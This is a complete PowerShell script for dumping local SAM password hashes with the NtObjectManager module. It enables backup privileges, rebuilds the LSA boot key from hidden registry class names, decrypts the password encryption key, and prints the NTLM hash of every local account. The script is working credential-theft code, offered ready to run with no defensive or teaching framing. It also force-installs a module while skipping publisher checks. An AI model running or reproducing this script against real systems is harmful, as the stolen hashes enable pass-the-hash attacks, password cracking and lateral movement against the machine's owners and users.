<#
.SYNOPSIS
    Dump Local SAM Hashes (NTLM) using NtObjectManager.
    
.DESCRIPTION
    This script retrieves the System Boot Key, decrypts the Password Encryption Key (PEK), 
    and then extracts/decrypts NTLM hashes for all local users from the SAM hive.
    It requires SYSTEM integrity or High Integrity with SeBackupPrivilege.

.USAGE
    PS C:\> . .\Dump-SAMHashes.ps1
#>

# 1. Ensure NtObjectManager is available
if (-not (Get-Module -Name NtObjectManager)) {
    Write-Host "[*] NtObjectManager not found. Attempting to import/install..." -ForegroundColor Yellow
    Install-Module NtObjectManager -Scope CurrentUser -Force -SkipPublisherCheck -ErrorAction SilentlyContinue
    Import-Module NtObjectManager
}

# 2. Main Logic
try {
    # Adjust Privs
    try {
        $null = Set-NtTokenPrivilege -Privileges SeBackupPrivilege, SeRestorePrivilege -ErrorAction SilentlyContinue
    } catch {}

    # --- CRYPTO HELPERS ---
    function Unprotect-AES([byte[]]$Data, [byte[]]$IV, [byte[]]$Key) {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Mode = "CBC"; $aes.Padding = "None"; $aes.Key = $Key; $aes.IV = $IV
        try { $aes.CreateDecryptor().TransformFinalBlock($Data, 0, $Data.Length) } catch { return $null }
    }

    # --- REGISTRY READERS ---
    function Get-LsaSystemKey {
        $names = "JD", "Skew1", "GBG", "Data"
        $selectPath = "\Registry\Machine\SYSTEM\Select"
        $selectKey = Get-NtKey -Path $selectPath -Access QueryValue -Options BackupRestore -ErrorAction SilentlyContinue
        $current = 1
        if ($selectKey) { $val = $selectKey.QueryValue("Current"); $current = $val.Data[0]; $selectKey.Close() }
        $cs = "ControlSet{0:d3}" -f $current
        $keybase = "\Registry\Machine\SYSTEM\$cs\Control\Lsa"
        $keyParts = $names | ForEach-Object {
            try {
                $k = Get-NtKey -Path "$keybase\$_" -Access ReadControl -Options BackupRestore -ErrorAction Stop
                $hex = $k.ClassName; $k.Close()
                if ($hex.Length -gt 0) {
                    $bytes = @(); for ($i=0; $i -lt $hex.Length; $i+=2) { $bytes += [Convert]::ToByte($hex.Substring($i, 2), 16) }
                    $bytes
                }
            } catch {}
        }
        if ($keyParts.Count -lt 4) { return $null }
        $p = 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7
        $sysKey = New-Object byte[] 16; for($i=0; $i -lt 16; $i++) { $sysKey[$i] = $keyParts[$p[$i]] }
        return $sysKey
    }

    function Unprotect-PEK($FVal, $SysKey) {
        try {
            $enctype = [BitConverter]::ToInt32($FVal, 0x68)
            if ($enctype -eq 2) { 
                $endofs = [BitConverter]::ToInt32($FVal, 0x6C) + 0x68
                $data = $FVal[0x70..($endofs-1)]
                $iv = $data[8..0x17]; $cipher = $data[0x18..($data.Length-1)]
                $decrypted = Unprotect-AES -Data $cipher -IV $iv -Key $SysKey
                if ($null -ne $decrypted -and $decrypted.Length -ge 16) { return $decrypted[0..15] }
            }
        } catch {}
        return $null
    }
    
    function Get-VariableAttribute($V, $Index) {
        if (-not $V) { return $null }
        $MaxAttr = 0x11; $base_ofs = $Index * 12
        if ($V.Length -lt ($base_ofs + 8)) { return $null }
        $curr_ofs = [System.BitConverter]::ToInt32($V, $base_ofs) + ($MaxAttr * 12)
        $len = [System.BitConverter]::ToInt32($V, $base_ofs + 4)
        if ($len -gt 0 -and ($curr_ofs + $len) -le $V.Length) { return $V[$curr_ofs..($curr_ofs+$len-1)] }
        return $null
    }

    function Unprotect-PasswordHashAES([byte[]]$Key, [byte[]]$Data) {
        if ($Data.Length -lt 24) { return @() }
        $IV = $Data[8..23]; $value = $Data[24..($Data.Length-1)]
        try {
            $plain = Unprotect-AES -Data $value -IV $IV -Key $Key
            if ($null -ne $plain -and $plain.Length -ge 16) { return $plain[0..15] }
        } catch {}
        return $null
    }

    # --- EXECUTION ---
    Write-Host "[*] Retrieving System Boot Key..." -ForegroundColor Cyan
    $sysKey = Get-LsaSystemKey
    if (-not $sysKey) { throw "Could not retrieve System Key. Ensure SeBackupPrivilege is active." }
    
    $samPath = "\Registry\Machine\SAM\SAM\Domains\Account"
    $samKey = Get-NtKey -Path $samPath -Access QueryValue -Options BackupRestore
    $fVal = $samKey.QueryValue("F").Data
    
    Write-Host "[*] Decrypting PEK..." -ForegroundColor Cyan
    $pek = Unprotect-PEK $fVal $sysKey
    if (-not $pek) { throw "Could not decrypt PEK." }
    Write-Host "[+] Password Encryption Key Decrypted." -ForegroundColor Green
    
    Write-Host "`n--- [ LOCAL SAM HASHES ] ---" -ForegroundColor Yellow
    Write-Host ("{0,-5} {1,-20} {2}" -f "RID", "Username", "NTLM Hash")
    Write-Host ("-" * 60)
    
    $usersPath = "$samPath\Users"
    $usersKey = Get-NtKey -Path $usersPath -Access EnumerateSubKeys -Options BackupRestore
    $users = $usersKey.QueryKeys()
    
    foreach ($uKeyEntry in $users) {
        $ridHex = if ($uKeyEntry.Name) { $uKeyEntry.Name } else { $uKeyEntry.ToString() }
        if ($ridHex -match "[^0-9a-fA-F]") { continue }
        $rid = [Convert]::ToInt32($ridHex, 16)
        
        $userKey = Get-NtKey -Path "$usersPath\$ridHex" -Access QueryValue -Options BackupRestore
        $vVal = $userKey.QueryValue("V").Data
        $userKey.Close()
        
        $nameBytes = Get-VariableAttribute $vVal 1
        $userName = if ($nameBytes) { [System.Text.Encoding]::Unicode.GetString($nameBytes) } else { "<Unknown>" }
        
        $ntHashEnc = Get-VariableAttribute $vVal 14 
        $finalHashHex = "Empty/Disabled"

        if ($ntHashEnc) {
            $hashType = [BitConverter]::ToInt16($ntHashEnc, 2)
            if ($hashType -eq 2) { 
                $finalBytes = Unprotect-PasswordHashAES -Key $pek -Data $ntHashEnc
                if ($null -ne $finalBytes -and $finalBytes.Count -gt 0) {
                    $finalHashHex = ($finalBytes | ForEach-Object { "{0:X2}" -f $_ }) -join ""
                }
            }
        }
        $OutputLine = "{0,-5} {1,-20} {2}" -f $rid, $userName, $finalHashHex
        Write-Host $OutputLine
    }
    $usersKey.Close(); $samKey.Close()

} catch {
    Write-Error "SAM Dump failed: $_"
    Write-Host "[-] Ensure you are running as SYSTEM or High Integrity with SeBackupPrivilege." -ForegroundColor Red
}
